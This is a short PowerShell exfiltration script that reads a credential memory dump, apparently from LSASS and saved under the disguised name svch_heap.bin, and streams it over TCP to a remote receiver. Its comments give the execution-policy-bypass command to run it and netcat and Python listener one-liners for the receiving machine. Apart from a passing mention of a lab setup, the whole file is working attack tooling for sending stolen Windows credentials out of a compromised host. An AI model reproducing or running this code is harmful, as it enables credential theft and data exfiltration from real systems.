# exfil.ps1 - TCP exfiltration for DumpRpm output
# Usage: powershell -ep bypass -f exfil.ps1
# Reads C:\Users\Public\svch_heap.bin and sends raw bytes to receiver over TCP.
#
# On the receiver side (Linux):
#   nc -lvp 9999 > lsass_raw.bin
#   # or: python3 -c "import socket,sys; s=socket.socket(); s.bind(('0.0.0.0',9999)); s.listen(1); c,_=s.accept(); sys.stdout.buffer.write(c.recv(1<<28)); c.close()"
#
# Receiver IP/port - edit to match your lab setup
$ReceiverIP   = '192.0.2.254'
$ReceiverPort = 9999
$DumpPath     = 'C:\Users\Public\svch_heap.bin'

$data = [System.IO.File]::ReadAllBytes($DumpPath)
Write-Host "[*] Sending $($data.Length) bytes to ${ReceiverIP}:${ReceiverPort}"

$tcp = New-Object System.Net.Sockets.TcpClient($ReceiverIP, $ReceiverPort)
$stream = $tcp.GetStream()
$stream.Write($data, 0, $data.Length)
$stream.Flush()
$tcp.Close()

Write-Host "[+] Done - $($data.Length) bytes sent"
